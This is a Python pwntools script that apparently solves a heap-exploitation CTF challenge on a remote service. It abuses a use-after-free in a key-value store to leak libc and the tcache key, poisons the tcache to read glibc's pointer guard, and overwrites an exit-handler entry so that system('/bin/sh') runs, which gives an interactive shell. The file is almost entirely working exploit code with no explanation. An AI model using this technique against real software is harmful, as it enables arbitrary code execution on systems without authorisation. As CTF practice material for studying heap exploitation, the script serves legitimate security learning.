from pwn import *
context.log_level='debug'
#r=process('./chal')
#r = gdb.debug('./chal', 'b *db_create\nb *main+332\nc')
#r=gdb.debug('./chal', 'b *main+332\nc')
r = remote('chal.amt.rs', 1346)
libc=ELF('./lib/libc.so.6')
def create(i,kl,kd,vl,vd):
    r.recvuntil(b'>>> ')
    r.sendline(b'1')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
    r.recvuntil(b'>>> ')
    r.sendline(str(kl).encode())
    r.recvuntil(b'>>>')
    r.sendline(kd)
    r.recvuntil(b'>>>')
    r.sendline(str(vl).encode())
    r.recvuntil(b'>>>')
    r.sendline(vd)
def update(i, data):
    r.recvuntil(b'>>>')
    r.sendline(b'2')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
    r.recvuntil(b'>>>')
    r.sendline(data)
def read(i):
    r.recvuntil(b'>>>')
    r.sendline(b'3')
    r.sendline(str(i).encode())
    r.recvuntil(b'key = ')
    k=eval("b'"+r.recvline(keepends=False).decode()+"'")
    r.recvuntil(b'val = ')
    v=eval("b'"+r.recvline(keepends=False).decode()+"'")
    return (k, v)
def delete(i):
    r.recvuntil(b'>>>')
    r.sendline(b'4')
    r.recvuntil(b'>>>')
    r.sendline(str(i).encode())
def depart():
    r.recvuntil(b'>>>')
    r.sendline(b'5')
rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
#create(0,0x20,b'',0x20,b'')
create(0,0x410,b'',0x50,b'')
delete(0)
libc_leak, key = read(0)
key = u64(key[:8])
libc_leak = u64(libc_leak[:8])
#unsorted bin->main_arena+96
#tcache chunk->key leak
libc.address = libc_leak - (0x21ac80 + 96)
print('key', hex(key))
print('libc.address', hex(libc.address))
create(0,0x410,b'',0x50,b'') #prevent malloc from cutting out of unsortedbin
create(1,0x50,b'',0x50,b'') #for later use
create(0,0x50,b'',0x50,b'')
delete(0)
update(0, p64(key^(libc.address - 0x28a0-0x8-0x8)))
create(0,0x50,b'',0x50,b'')
_, pointer_guard = read(0)
pointer_guard = u64(pointer_guard[32:32+8])
print('pointer_guard =', hex(pointer_guard))
delete(1)
update(1, p64(key^(libc.address+0x21bf00)))
create(0,0x50,b'',0x50,p64(0)+p64(1)+p64(4)+p64(rol(libc.sym['system']^pointer_guard, 0x11, 64))+p64(next(libc.search(b'/bin/sh')))+p64(0))
depart()
r.interactive()

